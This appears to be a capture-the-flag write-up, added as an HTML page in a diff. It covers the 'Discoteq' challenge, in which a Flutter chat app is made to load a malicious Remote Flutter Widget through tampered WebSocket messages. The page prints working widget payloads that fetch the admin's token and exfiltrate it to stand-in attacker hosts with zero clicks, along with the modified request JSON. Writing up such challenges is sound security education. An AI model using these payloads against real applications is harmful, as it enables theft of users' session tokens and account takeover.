@@ -1,0 +1,287 @@
+<h2>Discoteq [100]</h2>
+
+<h3>Credits</h3>
+
+<p>Thanks to Ocean, quanyang, kokrui and waituck for the great teamwork here!:thumbsup:</p>
+
+<h3>TL;DR</h3>
+
+<p>This was a Flutter-based chat application where we could send the admin any message that he would read. By manipulating Websocket requests, we could make the client load a malicious <a href="https://github.com/flutter/packages/tree/main/packages/rfw">remote Flutter widget</a> that would steal the admin's token and send it back to us.</p>
+
+<h3>Initial Observations</h3>
+
+<p>I was new to Flutter, so some time was spent analysing the <code>main.dart.js</code>, which is the Flutter app compiled by <code>dart2js</code>.</p>
+
+<p>Although we can't view it from our end, we could see that there is an <code>AdminPage</code>, and a <code>/api/flag</code> endpoint that is fetched using <code>postRequestWithCookies</code>.</p>
+
+<p><img src="../.gitbook/assets/Screenshot 2022-06-02 at 7.49.45 PM.png" alt="" /></p>
+
+<p>It might help to find some other sensitive endpoints. In <code>LoginPage</code>, we could see that there is a <code>/api/token</code> endpoint. This endpoint returns our current authentication token.</p>
+
+<p><img src="../.gitbook/assets/Screenshot 2022-06-02 at 8.00.19 PM.png" alt="" /></p>
+
+<p>Now, let's take a look at the application itself! The goal was to send an exploit to the <code>admin#13371337</code> user. There were two main features - sending a normal message and sending a poll.&#x20;</p>
+
+<p>When sending a poll, I noticed that there were some very suspicious parameters in the WebSocket message. By modifying the <code>apiGet</code> and <code>apiVote</code> paths, we get a callback on our server!</p>
+
+<p><code>json
+{
+    "type":"widget",
+    "widget":"/widget/poll",
+    "author":{
+        "user":"test#9b808596",
+        "platform":"web"
+    },
+    "recipients":["admin#13371337"],
+    "data":{
+        "title":"test",
+        "apiGet":"@ATTACKER_URL",
+        "apiVote":"@ATTACKER_URL"
+    }
+}
+</code></p>
+
+<p>The <code>widget</code>, <code>apiGet</code>, and <code>apiVote</code> paths are appended to the base URL without sanitization - so using <code>@ATTACKER_URL</code> causes the following URL to be constructed:</p>
+
+<p><code>http://BASE_URL@ATTACKER_URL</code></p>
+
+<p>I tried some XSS payloads, hoping that the poll wasn't sanitized. Alas, a Flutter web app is entirely rendered on a <code>&lt;canvas&gt;</code>, so rendering unescaped HTML was hopeless.</p>
+
+<p>I then tried to manipulate the <code>widget</code> parameter instead.</p>
+
+<p><code>json
+{
+    "type":"widget",
+    "widget":"@ATTACKER_URL/test",
+    "author":{
+        "user":"abcd#c7e80dd5",
+        "platform":"web"
+    },
+    "recipients":["admin#13371337"],
+    "data":{
+        "message":"test"
+    }
+}
+</code></p>
+
+<p>Aha! This causes a traceback!</p>
+
+<p><img src="../.gitbook/assets/image (87).png" alt="" /></p>
+
+<p>Note: to avoid CORS issues, use the <code>Access-Control-Allow-Origin: *</code> header. For example, in Flask:</p>
+
+<p><code>python
+@app.after_request
+def after_request(response):
+  response.headers['Access-Control-Allow-Methods']='*'
+  response.headers['Access-Control-Allow-Origin']='*'
+  response.headers['Vary']='Origin'
+  return response
+</code></p>
+
+<h3>What Even Is a Remote Flutter Widget?!</h3>
+
+<p>Ok so umm... I couldn't find this file signature anywhere, so the first step is to figure out what file format the file is expected to be in. We could download the original <code>/widget/chatmessage</code> widget and take a look:</p>
+
+<p><img src="../.gitbook/assets/image (81) (1).png" alt="" /></p>
+
+<p>This definitely contains styling and content information, but it isn't in an easily editable format.</p>
+
+<p>&#x20;At this point my teammate kokrui found that this file was compiled with a package called <a href="https://pub.dev/packages/rfw">Remote Flutter Widgets</a>, which allows the loading of widgets hosted on external servers.</p>
+
+<p><img src="../.gitbook/assets/Screenshot 2022-06-02 at 8.22.13 PM.png" alt="" /></p>
+
+<p>By following the examples <a href="https://github.com/flutter/packages/tree/main/packages/rfw">on GitHub</a>, we could decode the <code>chatmessage</code> widget.&#x20;</p>
+
+<p>```dart
+import 'dart:convert';
+import 'dart:io';
+import 'dart:typed_data';</p>
+
+<p>import 'package:rfw/formats.dart';</p>
+
+<p>void main() {
+  final Uint8List test = File('chatmessage.rfw').readAsBytesSync();
+  var out = decodeLibraryBlob(test);
+  print(out);
+}
+```</p>
+
+<p>Ocean also found the <code>pollmessage</code> and <code>imagemessage</code> widgets.</p>
+
+<p><img src="../.gitbook/assets/Screenshot 2022-06-02 at 8.32.09 PM.png" alt="" /></p>
+
+<p>There is rather limited documentation and examples of the RFW syntax, so I followed the <a href="https://pub.dev/documentation/rfw/latest/formats/parseLibraryFile.html"><code>parseLibraryFile</code> documentation</a>, which seems to provide the most examples.</p>
+
+<p>We tried various things, including this futile attempt to call the <code>Clipboard_getData</code> function we found in <code>main.dart.js</code>.</p>
+
+<p>```dart
+import core.widgets;
+import local;</p>
+
+<p>widget root = Container(
+  color: 0xFFF,
+  child: Center(
+    child: Text(text: [
+      "Hello, ", 
+      data.author.user, 
+      Clipboard_getData(format: "text/plain"), 
+      " this is working!!"
+    ], textDirection: "ltr"),
+  ),
+);
+```</p>
+
+<h3>onLoaded: Flag Please</h3>
+
+<p>Taking a closer look at <code>poll.dart</code> gave us some ideas.</p>
+
+<p>```dart
+// poll widget
+import core.widgets;
+import core.material;
+import local;</p>
+
+<p>widget root = Container({
+  child: Column({
+    children: [</p>
+
+<pre><code>  ...
+
+  switch state.loaded {
+    true: Column({
+      children: [...for loop in data.poll_options:
+        Row({
+          children: [
+            Padding({
+              child: ElevatedButton({
+                child: Text({
+                  text: loop0.text
+                }),
+                onPressed: event api_post {
+                  path: data.data.apiVote,
+                  body: {selection: loop0.text}
+                }
+              }),
+              padding: [0.0, 5.0, 10.0, 0.0]
+            }),
+            Text({
+              text: loop0.count
+            })
+          ]}),
+
+        ...
+
+      ]
+    }),
+  null: ApiMapper({
+    url: data.data.apiGet,
+    jsonKey: options,
+    dataKey: poll_options,
+    onLoaded: set state.loaded = true
+  })
+}]
+</code></pre>
+
+<p>})
+```</p>
+
+<p>Notice that <code>ApiMapper</code> makes a GET request to the specified <code>apiGet</code> URL. The response data is then saved in <code>data.&lt;dataKey&gt;</code>, as we can see from the loop accessing <code>data.poll_options</code>.</p>
+
+<p>Further, the <code>onPressed</code> event handler, <code>api_post</code>, seemingly provides a mechanism for us to exfiltrate our data.</p>
+
+<p>For example, the following will fetch the poll options and exfiltrate them to <code>example.com</code>.</p>
+
+<p>```dart
+import core.widgets;
+import core.material;
+import local;</p>
+
+<p>widget root { loaded: false } = Container(
+  color: 0xFFF,
+  child:
+      switch state.loaded {
+        true: 
+          TextButton(
+            child: Text(
+              text: "HI",
+            ),
+            onPressed: event "api_post" {
+              path: "@example.com",
+              body: {
+                selection: data.apiData
+              }
+            }
+          ),
+        false:
+          ApiMapper(
+            url: "/api/poll/options?poll=4b06175d-7f78-44b1-a132-183d6707a33a",
+            jsonKey: "options",
+            dataKey: "apiData",
+            onLoaded: set state.loaded = true
+          )
+      }
+);
+```</p>
+
+<p>There were still a few problems with this, though. The <code>/api/flag</code> endpoint requires a POST request, and <code>ApiMapper</code> only does GET requests. Additionally, we needed to make this zero-click.</p>
+
+<p>The first part was simple enough - we just needed to steal the admin's token to authenticate as the admin, so something like this works:</p>
+
+<p><code>dart
+ApiMapper(
+    url: '/api/token',
+    jsonKey: 'new_token',
+    dataKey: 'token',
+    onLoaded: set state.loaded = true
+)
+</code></p>
+
+<p>Next, the <code>onLoaded</code> event handler could be used to trigger the <code>api_post</code> event for zero-click exfiltration. But this was a bit iffy and only worked in some scenarios, such as the following one.</p>
+
+<p>```dart
+import local;
+import core.widgets;</p>
+
+<p>widget root { loaded: false }= Container(
+    child:
+      switch state.loaded {
+          true:
+              Column(
+                children: [
+                  Row(children: 
+                    Center(children:
+                      [
+                        Text(text: data.token, textDirection: "ltr"),
+                      ]
+                    )
+                  ),
+                  ApiMapper(
+                    url: '/api/token',
+                    jsonKey: 'new<em>token',
+                    dataKey: 'token',
+                    onLoaded: event 'api</em>post' {
+                      path: '@ATTACKER<em>URL',
+                      body: {selection: data.token}
+                    }
+                  )
+                ]
+              ),
+          false:
+              ApiMapper(
+                  url: '/api/token',
+                  jsonKey: 'new</em>token',
+                  dataKey: 'token',
+                  onLoaded: set state.loaded = true
+              )
+      }</p>
+
+<p>);</p>
+
+<p>```</p>
+
+<p>For example, here's me getting my own token.</p>
+
+<p><img src="../.gitbook/assets/image (84).png" alt="" /></p>
+
+<p>After getting the admin's token, we just needed to get the flag from <code>/api/flag</code>.</p>
